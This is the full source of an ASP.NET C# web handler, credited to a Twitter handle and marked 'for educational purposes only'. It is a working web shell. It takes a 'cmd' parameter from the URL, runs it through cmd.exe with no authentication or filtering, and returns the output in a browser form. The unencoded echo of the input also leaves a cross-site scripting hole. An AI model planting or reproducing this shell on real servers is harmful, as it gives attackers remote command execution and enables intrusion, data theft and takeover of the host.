<% @ webhandler language="C#" class="AverageHandler" %>

using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class AverageHandler : IHttpHandler
{
  /* .Net requires this to be implemented */
  public bool IsReusable
  {
    get { return true; }
  }

  /* main executing code */
  public void ProcessRequest(HttpContext ctx)
  {
    Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
    string command = HttpUtility.ParseQueryString(url.Query).Get("cmd");

    ctx.Response.Write("<form method='GET'>Command: <input name='cmd' value='"+command+"'><input type='submit' value='Run'></form>");
    ctx.Response.Write("<hr>");
    ctx.Response.Write("<pre>");

    /* command execution and output retrieval */
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c "+command;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();

    ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));
    ctx.Response.Write("</pre>");
    ctx.Response.Write("<hr>");
    ctx.Response.Write("By <a href='http://www.twitter.com/Hypn'>@Hypn</a>, for educational purposes only.");
 }
}
